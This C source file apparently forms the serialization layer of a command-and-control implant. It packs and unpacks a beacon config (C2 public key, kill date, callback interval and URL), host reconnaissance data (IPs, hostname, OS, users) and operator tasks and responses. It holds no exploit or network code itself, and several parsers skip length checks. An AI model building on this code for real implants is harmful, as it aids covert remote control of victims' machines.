/**
 * Flatty serialization/deserialization implementation
 */

#include "flatty.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Helper to write little-endian integers
static void write_le32(uint8_t* buffer, uint32_t value) {
    buffer[0] = (value >>  0) & 0xFF;
    buffer[1] = (value >>  8) & 0xFF;
    buffer[2] = (value >> 16) & 0xFF;
    buffer[3] = (value >> 24) & 0xFF;
}

static void write_le64(uint8_t* buffer, uint64_t value) {
    buffer[0] = (value >>  0) & 0xFF;
    buffer[1] = (value >>  8) & 0xFF;
    buffer[2] = (value >> 16) & 0xFF;
    buffer[3] = (value >> 24) & 0xFF;
    buffer[4] = (value >> 32) & 0xFF;
    buffer[5] = (value >> 40) & 0xFF;
    buffer[6] = (value >> 48) & 0xFF;
    buffer[7] = (value >> 56) & 0xFF;
}

static uint32_t read_le32(const uint8_t* buffer) {
    return ((uint32_t)buffer[0] <<  0) |
           ((uint32_t)buffer[1] <<  8) |
           ((uint32_t)buffer[2] << 16) |
           ((uint32_t)buffer[3] << 24);
}

static uint64_t read_le64(const uint8_t* buffer) {
    return ((uint64_t)buffer[0] <<  0) |
           ((uint64_t)buffer[1] <<  8) |
           ((uint64_t)buffer[2] << 16) |
           ((uint64_t)buffer[3] << 24) |
           ((uint64_t)buffer[4] << 32) |
           ((uint64_t)buffer[5] << 40) |
           ((uint64_t)buffer[6] << 48) |
           ((uint64_t)buffer[7] << 56);
}

// Serialize/deserialize primitives
size_t serialize_string(const char* str, uint8_t* buffer) {
    size_t len = str ? strlen(str) : 0;
    write_le64(buffer, len);
    if (len > 0) {
        memcpy(buffer + 8, str, len);
    }
    return 8 + len;
}

size_t deserialize_string(const uint8_t* buffer, size_t buffer_len, char** str) {
    if (buffer_len < 8) return 0;

    uint64_t len = read_le64(buffer);
    if (buffer_len < 8 + len) return 0;

    *str = (char*)malloc(len + 1);
    if (!*str) return 0;

    if (len > 0) {
        memcpy(*str, buffer + 8, len);
    }
    (*str)[len] = '\0';

    return 8 + len;
}

size_t serialize_int32(int32_t value, uint8_t* buffer) {
    write_le32(buffer, (uint32_t)value);
    return 4;
}

size_t deserialize_int32(const uint8_t* buffer, int32_t* value) {
    *value = (int32_t)read_le32(buffer);
    return 4;
}

size_t serialize_int64(int64_t value, uint8_t* buffer) {
    write_le64(buffer, (uint64_t)value);
    return 8;
}

size_t deserialize_int64(const uint8_t* buffer, int64_t* value) {
    *value = (int64_t)read_le64(buffer);
    return 8;
}

size_t serialize_bool(bool value, uint8_t* buffer) {
    buffer[0] = value ? 1 : 0;
    return 1;
}

size_t deserialize_bool(const uint8_t* buffer, bool* value) {
    *value = buffer[0] != 0;
    return 1;
}

size_t serialize_bytes(const uint8_t* data, size_t len, uint8_t* buffer) {
    write_le64(buffer, len);
    if (len > 0) {
        memcpy(buffer + 8, data, len);
    }
    return 8 + len;
}

size_t deserialize_bytes(const uint8_t* buffer, size_t buffer_len, uint8_t** data, size_t* len) {
    if (buffer_len < 8) return 0;

    *len = read_le64(buffer);
    if (buffer_len < 8 + *len) return 0;

    *data = (uint8_t*)malloc(*len);
    if (!*data) return 0;

    if (*len > 0) {
        memcpy(*data, buffer + 8, *len);
    }

    return 8 + *len;
}

// Key serialization (just the raw 32 bytes)
size_t serialize_key(const Key* key, uint8_t* buffer) {
    memcpy(buffer, key->data, KEY_SIZE);
    return KEY_SIZE;
}

size_t deserialize_key(const uint8_t* buffer, size_t buffer_len, Key* key) {
    if (buffer_len < KEY_SIZE) return 0;
    memcpy(key->data, buffer, KEY_SIZE);
    return KEY_SIZE;
}

// EncObj serialization
size_t serialize_enc_obj(const EncObj* obj, uint8_t* buffer) {
    size_t offset = 0;

    // publicKey (32 bytes)
    memcpy(buffer + offset, obj->publicKey.data, KEY_SIZE);
    offset += KEY_SIZE;

    // nonce (24 bytes)
    memcpy(buffer + offset, obj->nonce.data, NONCE_SIZE);
    offset += NONCE_SIZE;

    // mac (16 bytes)
    memcpy(buffer + offset, obj->mac.data, MAC_SIZE);
    offset += MAC_SIZE;

    // cipherLen (int64)
    offset += serialize_int64(obj->cipherLen, buffer + offset);

    // cipherText (seq[byte])
    offset += serialize_bytes(obj->cipherText, obj->cipherLen, buffer + offset);

    return offset;
}

size_t deserialize_enc_obj(const uint8_t* buffer, size_t buffer_len, EncObj* obj) {
    size_t offset = 0;

    if (buffer_len < KEY_SIZE + NONCE_SIZE + MAC_SIZE + 8 + 8) return 0;

    // publicKey
    memcpy(obj->publicKey.data, buffer + offset, KEY_SIZE);
    offset += KEY_SIZE;

    // nonce
    memcpy(obj->nonce.data, buffer + offset, NONCE_SIZE);
    offset += NONCE_SIZE;

    // mac
    memcpy(obj->mac.data, buffer + offset, MAC_SIZE);
    offset += MAC_SIZE;

    // cipherLen
    offset += deserialize_int64(buffer + offset, &obj->cipherLen);

    // cipherText (seq[byte])
    size_t cipher_len;
    size_t bytes_read = deserialize_bytes(buffer + offset, buffer_len - offset,
                                          &obj->cipherText, &cipher_len);
    if (bytes_read == 0) return 0;
    offset += bytes_read;

    // Verify cipherLen matches
    if (obj->cipherLen != (int64_t)cipher_len) {
        free(obj->cipherText);
        obj->cipherText = NULL;
        return 0;
    }

    return offset;
}

// EncConfig serialization (ref object - starts with nil flag byte)
size_t serialize_enc_config(const EncConfig* config, uint8_t* buffer) {
    size_t offset = 0;

    // Ref object nil flag (0 = not nil)
    buffer[offset++] = 0;

    // privKey
    memcpy(buffer + offset, config->privKey.data, KEY_SIZE);
    offset += KEY_SIZE;

    // pubKey
    memcpy(buffer + offset, config->pubKey.data, KEY_SIZE);
    offset += KEY_SIZE;

    // encObj
    offset += serialize_enc_obj(&config->encObj, buffer + offset);

    return offset;
}

size_t deserialize_enc_config(const uint8_t* buffer, size_t buffer_len, EncConfig* config) {
    size_t offset = 0;

    if (buffer_len < 1) return 0;

    // Check nil flag
    uint8_t nil_flag = buffer[offset++];
    if (nil_flag == 1) return 0; // nil object

    if (buffer_len < 1 + KEY_SIZE + KEY_SIZE) return 0;

    // privKey
    memcpy(config->privKey.data, buffer + offset, KEY_SIZE);
    offset += KEY_SIZE;

    // pubKey
    memcpy(config->pubKey.data, buffer + offset, KEY_SIZE);
    offset += KEY_SIZE;

    // encObj
    size_t enc_obj_size = deserialize_enc_obj(buffer + offset, buffer_len - offset,
                                              &config->encObj);
    if (enc_obj_size == 0) return 0;
    offset += enc_obj_size;

    return offset;
}

// StaticConfig serialization (ref object)
size_t serialize_static_config(const StaticConfig* config, uint8_t* buffer) {
    size_t offset = 0;

    // Ref object nil flag (0 = not nil)
    buffer[offset++] = 0;

    // buildID
    offset += serialize_string(config->buildID, buffer + offset);

    // deploymentID
    offset += serialize_string(config->deploymentID, buffer + offset);

    // c2PubKey
    memcpy(buffer + offset, config->c2PubKey.data, KEY_SIZE);
    offset += KEY_SIZE;

    // killEpoch
    offset += serialize_int32(config->killEpoch, buffer + offset);

    // interval
    offset += serialize_int32(config->interval, buffer + offset);

    // callback
    offset += serialize_string(config->callback, buffer + offset);

    return offset;
}

size_t deserialize_static_config(const uint8_t* buffer, size_t buffer_len, StaticConfig* config) {
    size_t offset = 0;

    if (buffer_len < 1) return 0;

    // Check nil flag
    uint8_t nil_flag = buffer[offset++];
    if (nil_flag == 1) return 0; // nil object

    // buildID
    size_t bytes_read = deserialize_string(buffer + offset, buffer_len - offset,
                                           &config->buildID);
    if (bytes_read == 0) return 0;
    offset += bytes_read;

    // deploymentID
    bytes_read = deserialize_string(buffer + offset, buffer_len - offset,
                                   &config->deploymentID);
    if (bytes_read == 0) {
        free(config->buildID);
        return 0;
    }
    offset += bytes_read;

    // c2PubKey
    if (buffer_len < offset + KEY_SIZE) {
        free(config->buildID);
        free(config->deploymentID);
        return 0;
    }
    memcpy(config->c2PubKey.data, buffer + offset, KEY_SIZE);
    offset += KEY_SIZE;

    // killEpoch
    offset += deserialize_int32(buffer + offset, &config->killEpoch);

    // interval
    offset += deserialize_int32(buffer + offset, &config->interval);

    // callback
    bytes_read = deserialize_string(buffer + offset, buffer_len - offset,
                                   &config->callback);
    if (bytes_read == 0) {
        free(config->buildID);
        free(config->deploymentID);
        return 0;
    }
    offset += bytes_read;

    return offset;
}

// Status serialization
size_t serialize_status(const Status* status, uint8_t* buffer) {
    size_t offset = 0;

    offset += serialize_string(status->ip, buffer + offset);
    offset += serialize_string(status->externalIP, buffer + offset);
    offset += serialize_string(status->hostname, buffer + offset);
    offset += serialize_string(status->os, buffer + offset);
    offset += serialize_string(status->arch, buffer + offset);
    offset += serialize_string(status->users, buffer + offset);
    offset += serialize_int64(status->bootTime, buffer + offset);

    return offset;
}

size_t deserialize_status(const uint8_t* buffer, size_t buffer_len, Status* status) {
    size_t offset = 0;
    size_t bytes_read;

    // ip
    bytes_read = deserialize_string(buffer + offset, buffer_len - offset, &status->ip);
    if (bytes_read == 0) return 0;
    offset += bytes_read;

    // externalIP
    bytes_read = deserialize_string(buffer + offset, buffer_len - offset, &status->externalIP);
    if (bytes_read == 0) goto cleanup_ip;
    offset += bytes_read;

    // hostname
    bytes_read = deserialize_string(buffer + offset, buffer_len - offset, &status->hostname);
    if (bytes_read == 0) goto cleanup_externalIP;
    offset += bytes_read;

    // os
    bytes_read = deserialize_string(buffer + offset, buffer_len - offset, &status->os);
    if (bytes_read == 0) goto cleanup_hostname;
    offset += bytes_read;

    // arch
    bytes_read = deserialize_string(buffer + offset, buffer_len - offset, &status->arch);
    if (bytes_read == 0) goto cleanup_os;
    offset += bytes_read;

    // users
    bytes_read = deserialize_string(buffer + offset, buffer_len - offset, &status->users);
    if (bytes_read == 0) goto cleanup_arch;
    offset += bytes_read;

    // bootTime
    offset += deserialize_int64(buffer + offset, &status->bootTime);

    return offset;

cleanup_arch:
    free(status->arch);
cleanup_os:
    free(status->os);
cleanup_hostname:
    free(status->hostname);
cleanup_externalIP:
    free(status->externalIP);
cleanup_ip:
    free(status->ip);
    return 0;
}

// Callback serialization (ref object)
size_t serialize_callback(const Callback* callback, uint8_t* buffer) {
    size_t offset = 0;

    // Ref object nil flag (0 = not nil)
    buffer[offset++] = 0;

    // config (StaticConfig ref)
    offset += serialize_static_config(callback->config, buffer + offset);

    // status (Status)
    offset += serialize_status(callback->status, buffer + offset);

    return offset;
}

size_t deserialize_callback(const uint8_t* buffer, size_t buffer_len, Callback* callback) {
    size_t offset = 0;

    if (buffer_len < 1) return 0;

    // Check nil flag
    uint8_t nil_flag = buffer[offset++];
    if (nil_flag == 1) return 0; // nil object

    // Allocate config
    callback->config = (StaticConfig*)malloc(sizeof(StaticConfig));
    if (!callback->config) return 0;
    memset(callback->config, 0, sizeof(StaticConfig));

    // Deserialize config
    size_t bytes_read = deserialize_static_config(buffer + offset, buffer_len - offset,
                                                  callback->config);
    if (bytes_read == 0) {
        free(callback->config);
        return 0;
    }
    offset += bytes_read;

    // Allocate status
    callback->status = (Status*)malloc(sizeof(Status));
    if (!callback->status) {
        free_static_config(callback->config);
        free(callback->config);
        return 0;
    }
    memset(callback->status, 0, sizeof(Status));

    // Deserialize status
    bytes_read = deserialize_status(buffer + offset, buffer_len - offset, callback->status);
    if (bytes_read == 0) {
        free_static_config(callback->config);
        free(callback->config);
        free(callback->status);
        return 0;
    }
    offset += bytes_read;

    return offset;
}

// Task serialization
size_t serialize_task(const Task* task, uint8_t* buffer) {
    size_t offset = 0;

    offset += serialize_string(task->taskId, buffer + offset);
    offset += serialize_int64(task->taskNum, buffer + offset);
    offset += serialize_bool(task->retrieved, buffer + offset);
    offset += serialize_bool(task->complete, buffer + offset);
    offset += serialize_string(task->arg, buffer + offset);
    offset += serialize_string(task->resp, buffer + offset);

    return offset;
}

size_t deserialize_task(const uint8_t* buffer, size_t buffer_len, Task* task) {
    size_t offset = 0;
    size_t bytes_read;

    bytes_read = deserialize_string(buffer + offset, buffer_len - offset, &task->taskId);
    if (bytes_read == 0) return 0;
    offset += bytes_read;

    offset += deserialize_int64(buffer + offset, &task->taskNum);
    offset += deserialize_bool(buffer + offset, &task->retrieved);
    offset += deserialize_bool(buffer + offset, &task->complete);

    bytes_read = deserialize_string(buffer + offset, buffer_len - offset, &task->arg);
    if (bytes_read == 0) {
        free(task->taskId);
        return 0;
    }
    offset += bytes_read;

    bytes_read = deserialize_string(buffer + offset, buffer_len - offset, &task->resp);
    if (bytes_read == 0) {
        free(task->taskId);
        free(task->arg);
        return 0;
    }
    offset += bytes_read;

    return offset;
}

// Resp serialization
size_t serialize_resp(const Resp* resp, uint8_t* buffer) {
    size_t offset = 0;

    offset += serialize_string(resp->taskId, buffer + offset);
    offset += serialize_string(resp->resp, buffer + offset);

    return offset;
}

size_t deserialize_resp(const uint8_t* buffer, size_t buffer_len, Resp* resp) {
    size_t offset = 0;
    size_t bytes_read;

    bytes_read = deserialize_string(buffer + offset, buffer_len - offset, &resp->taskId);
    if (bytes_read == 0) return 0;
    offset += bytes_read;

    bytes_read = deserialize_string(buffer + offset, buffer_len - offset, &resp->resp);
    if (bytes_read == 0) {
        free(resp->taskId);
        return 0;
    }
    offset += bytes_read;

    return offset;
}

// Size calculation helpers
size_t calc_enc_obj_size(const EncObj* obj) {
    return KEY_SIZE + NONCE_SIZE + MAC_SIZE + 8 + (8 + obj->cipherLen);
}

size_t calc_enc_config_size(const EncConfig* config) {
    return 1 + KEY_SIZE + KEY_SIZE + calc_enc_obj_size(&config->encObj);
}

size_t calc_static_config_size(const StaticConfig* config) {
    return 1 + // nil flag
           (8 + strlen(config->buildID)) +
           (8 + strlen(config->deploymentID)) +
           KEY_SIZE + 4 + 4 +
           (8 + strlen(config->callback));
}

size_t calc_status_size(const Status* status) {
    return (8 + strlen(status->ip)) +
           (8 + strlen(status->externalIP)) +
           (8 + strlen(status->hostname)) +
           (8 + strlen(status->os)) +
           (8 + strlen(status->arch)) +
           (8 + strlen(status->users)) +
           8;
}

size_t calc_callback_size(const Callback* callback) {
    return 1 + calc_static_config_size(callback->config) +
           calc_status_size(callback->status);
}

size_t calc_task_size(const Task* task) {
    return (8 + strlen(task->taskId)) +
           8 + 1 + 1 +
           (8 + strlen(task->arg)) +
           (8 + strlen(task->resp));
}

size_t calc_resp_size(const Resp* resp) {
    return (8 + strlen(resp->taskId)) +
           (8 + strlen(resp->resp));
}
